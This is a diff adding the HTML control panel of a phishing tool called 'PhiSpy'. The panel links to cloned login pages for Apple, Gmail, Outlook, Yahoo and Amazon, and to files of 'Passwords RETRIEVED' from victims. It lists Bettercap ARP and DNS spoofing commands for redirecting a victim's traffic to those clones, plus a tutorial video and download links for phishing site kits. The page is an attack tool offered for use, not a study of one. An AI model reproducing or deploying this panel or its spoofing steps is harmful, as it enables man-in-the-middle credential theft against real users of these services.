@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>PhiSpy Tool</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+html,body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
+</style>
+</head>
+<body class="w3-light-grey">
+
+<!-- Top container -->
+<div class="w3-bar w3-top w3-black w3-large" style="z-index:4">
+  <button class="w3-bar-item w3-button w3-hide-large w3-hover-none w3-hover-text-light-grey" onclick="w3_open();"><i class="fa fa-bars"></i>  Menu</button>
+  <span class="w3-bar-item w3-left">PhiSpy Tool</span>
+</div>
+
+<!-- Sidebar/menu -->
+<nav class="w3-sidebar w3-collapse w3-white w3-animate-left" style="z-index:3;width:300px;" id="mySidebar"><br>
+  <div class="w3-container w3-row">
+    <div class="w3-col s4">
+      <img src="./logo.png" class="w3-circle w3-margin-right" style="width:46px">
+    </div>
+    <div class="w3-col s8 w3-bar">
+      <span>Welcome, <strong>Ninja</strong></span><br>
+      <a href="#" class="w3-bar-item w3-button">Web App V1.1</a>
+    </div>
+  </div>
+  <hr>
+  <div class="w3-container">
+    <h5>Phishing Websites</h5>
+  </div>
+  <div class="w3-bar-block">
+    <a href="./sites/apple/index.html" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Apple</a>
+    <a href="./sites/google/index.php" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Google Gmail</a>
+    <a href="./sites/microsoft/login.html" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Microsoft Outlook</a>
+    <a href="./sites/yahoo/login.html" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Yahoo Mail</a>
+    <a href="./sites/amazon/login.html" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Amazon</a>
+
+  </div>
+  <div class="w3-container">
+    <h5>Passwords RETRIEVED</h5>
+  </div>
+  <div class="w3-bar-block">
+    <a href="./sites/apple/usernames.txt" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Apple</a>
+    <a href="./sites/google/usernames.txt" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Google Gmail</a>
+    <a href="./sites/microsoft/usernames.txt" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Microsoft Outlook</a>
+    <a href="./sites/yahoo/usernames.txt" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Yahoo Mail</a>
+    <a href="./sites/amazon/usernames.txt" target="_blank" class="w3-bar-item w3-button w3-padding"><i class="fa fa-bullseye fa-fw"></i>  Amazon</a>
+
+  </div>
+</nav>
+
+
+<!-- Overlay effect when opening sidebar on small screens -->
+<div class="w3-overlay w3-hide-large w3-animate-opacity" onclick="w3_close()" style="cursor:pointer" title="close side menu" id="myOverlay"></div>
+
+<!-- !PAGE CONTENT! -->
+<div class="w3-main" style="margin-left:300px;margin-top:43px;">
+
+  <!-- Header -->
+  <header class="w3-container" style="padding-top:22px">
+    <h5><b><i class="fa fa-dashboard"></i> ./run Bettercap - ARP & DNS Spoofing</b></h5>
+  </header>
+
+  
+  <div class="w3-panel">
+    <div class="w3-row-padding" style="margin:0 -16px">
+      <div class="w3-third">
+        <img src="./1_6iHUFcKO53Y_n5en8bQ2Vg@2x.jpg" style="width:100%" alt="Google Regional Map">
+      </div>
+      <div class="w3-twothird">
+        <h5>PhiSpy Phishing Tool for Bettercap (DNS/ARP SPOOF) w/(Apache + PhP Server)</h5>
+        <table class="w3-table w3-striped w3-white">
+          <tr>
+            <td><i>PhiSpy is a tool created in HTML/CSS/JAVASCRIPT & PHP to phish servers created for DNS spoofing.</i></td>
+          </tr>
+        </table>
+        <table class="w3-table w3-striped w3-white">
+          <tr>
+            <td><i>Bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks.</i></td>
+          </tr>
+        </table>
+      </div>
+    </div>
+  </div>
+  <hr>
+
+  <div class="w3-container">
+    <h5>Bettercap Commands to ARP & DNS Spoof</h5>
+    <table class="w3-table w3-striped w3-bordered w3-border w3-hoverable w3-white">
+      <tr>
+        <td>NET.RECON ON/OFF</td>
+        <td>Inicializar Scan na Rede para fixar maquina em "utilizacao", Atacante e maquina da Vitima</td>
+      </tr>
+      <tr>
+        <td>NEW.SHOW + set arp.spoof.targets (Ip da Vitima)</td>
+        <td>Ver maquinas, e definir a maquina da vitima</td>
+      </tr>
+      <tr>
+        <td>ARP.SPOOF ON + set dns.spoof.adress (Ip do Atacante)</td>
+        <td>Ativar Spoof e definir Ip de Direcionamento do Spoof</td>
+      </tr>
+      <tr>
+        <td>set dns.spoof.domains (Dominio Desejado para Trocar)</td>
+        <td>Definir DOMINIO (TROCAR POR PHISHING)</td>
+      </tr>
+      <tr>
+    </table><br>
+  </div>
+  <div class="w3-container">
+    <h5>Video Tutorial</h5>
+    <table class="w3-table w3-striped w3-bordered w3-border w3-hoverable w3-white">
+      <tr>
+        <td>Youtube - Instructions for Phishing with Bettercap using this WebApp in a cloud server or lan open port server. (Example: NGrok,Xampp,Apache2)</td>
+        <td>https://www.youtube.com/watch?v=CfKOFEKEboE</td>
+      </tr>
+      <tr>
+    </table><br>
+  </div>
+  <div class="w3-container">
+    <h5>DOWNLOAD Websites LIST for Phishing w/Man-In-The-Middle</h5>
+    <table class="w3-table w3-striped w3-bordered w3-border w3-hoverable w3-white">
+      <tr>
+        <td>Mega.Nz FULL</td>
+        <td>https://mega.nz/file/CTgiiAAZ#SIUyO_dtzMtCdV8CX9Tvkl9W5YADFTGJw2LeuENrGSk</td>
+      </tr>
+      <tr>
+        <td>Mega.NZ Mail</td>
+        <td>https://mega.nz/file/LaQzWbKJ#C_9d16-dlLM7Ra7jX_e4pIb7Exr4dyiJvYq5-Sijvj8</td>
+        <td></td>
+      </tr>
+      <tr>
+    </table><br>
+
+  </div>
+
+
+  <hr>
+  <!-- Footer --
+
+  <!-- End page content -->
+</div>
+
+<script>
+// Get the Sidebar
+var mySidebar = document.getElementById("mySidebar");
+
+// Get the DIV with overlay effect
+var overlayBg = document.getElementById("myOverlay");
+
+// Toggle between showing and hiding the sidebar, and add overlay effect
+function w3_open() {
+  if (mySidebar.style.display === 'block') {
+    mySidebar.style.display = 'none';
+    overlayBg.style.display = "none";
+  } else {
+    mySidebar.style.display = 'block';
+    overlayBg.style.display = "block";
+  }
+}
+
+// Close the sidebar with the close button
+function w3_close() {
+  mySidebar.style.display = "none";
+  overlayBg.style.display = "none";
+}
+</script>
+
+</body>
+</html>
